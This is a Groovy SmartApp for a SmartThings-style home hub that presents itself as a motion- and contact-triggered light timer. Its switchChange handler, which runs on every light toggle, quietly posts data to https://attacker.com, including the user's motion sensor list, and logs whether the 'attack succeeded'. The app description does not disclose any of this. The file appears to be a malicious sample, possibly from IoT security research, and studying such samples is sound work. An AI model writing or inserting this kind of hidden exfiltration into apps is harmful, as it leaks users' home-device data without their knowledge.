

definition(
    name:"Smart Light Timer,X minutes unless already on",
    namespace:"Pope",
    author:"listpope@cox.net",
    description:"Turns on a switch for X minutes,then turns it off.Unless,the switch is already on,in which case it stays on.If the switch is toggled while the timer is running,the timer is canceled.",
    category:"Convenience",
    iconUrl:"http://upload.wikimedia.org/wikipedia/commons/6/6 a/Light_bulb_icon_tips.svg",
    iconX2Url:"http://upload.wikimedia.org/wikipedia/commons/6/6 a/Light_bulb_icon_tips.svg")

preferences{
    section("Turn on when there's movement..."){
        input"motions","capability.motionSensor",multiple:true,title:"Select motion detectors",required:false
        }
    section("Or,turn on when one of these contacts opened"){
        input"contacts","capability.contactSensor",multiple:true,title:"Select Contacts",required:false
        }
    section("And off after no more triggers after..."){
        input"minutes1","number",title:"Minutes?",defaultValue:"5"
        }
    section("Turn on/off light(s)..."){
        input"switches","capability.switch",multiple:true,title:"Select Lights"
        }
}

def installed(){
    initialize()
}

def updated(){
    unsubscribe()
    initialize()
    
    log.debug"state:"+state.myState
}

def initialize(){
    subscribe(switches,"switch",switchChange)
    subscribe(motions,"motion",motionHandler)
    subscribe(contacts,"contact",contactHandler)
    
    runEvery1Minute("scheduleCheck")
    state.myState="ready"
}

def switchChange(evt){
    log.debug"SwitchChange:$evt.name:$evt.value"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hi"
    ]
    ]
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${motions}"
    ]
    ]
    
    if(evt.value=="on"){
        
        
        
        if(state.myState=="activating"){
            
            state.myState="active"
        }else if(state.myState!="active"){
                state.myState="already on"
            }
    }else{
            
            if(state.myState=="active"||state.myState=="activating"){
                unschedule()
            }
            state.myState="ready"
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    log.debug"state:"+state.myState
}

def contactHandler(evt){
    log.debug"contactHandler:$evt.name:$evt.value"
    
    if(evt.value=="open"){
        if(state.myState=="ready"){
            log.debug"Turning on lights by contact opening"
            switches.on()
            state.inactiveAt=null
            state.myState="activating"
        }
    }else if(evt.value=="closed"){
            if(!state.inactiveAt&&state.myState=="active"||state.myState=="activating"){
                
                setActiveAndSchedule()
            }
        }
    log.debug"state:"+state.myState
}

def motionHandler(evt){
    log.debug"motionHandler:$evt.name:$evt.value"
    
    if(evt.value=="active"){
        if(state.myState=="ready"||state.myState=="active"||state.myState=="activating"){
            log.debug"turning on lights"
            switches.on()
            state.inactiveAt=null
            state.myState="activating"
        }
    }else if(evt.value=="inactive"){
            if(!state.inactiveAt&&state.myState=="active"||state.myState=="activating"){
                
                setActiveAndSchedule()
            }
        }
    log.debug"state:"+state.myState
}

def setActiveAndSchedule(){
    unschedule()
    state.myState="active"
    state.inactiveAt=now()
    runEvery1Minute("scheduleCheck")
}

def scheduleCheck(){
    log.debug"schedule check,ts=${state.inactiveAt}"
    if(state.myState!="already on"){
        if(state.inactiveAt!=null){
            def elapsed=now()-state.inactiveAt
            log.debug"${elapsed/1000}sec since motion stopped"
            def threshold=1000*60*minutes1
            if(elapsed>=threshold){
                if(state.myState=="active"){
                    log.debug"turning off lights"
                    switches.off()
                }
                state.inactiveAt=null
                state.myState="ready"
            }
        }
    }
    log.debug"state:"+state.myState
}

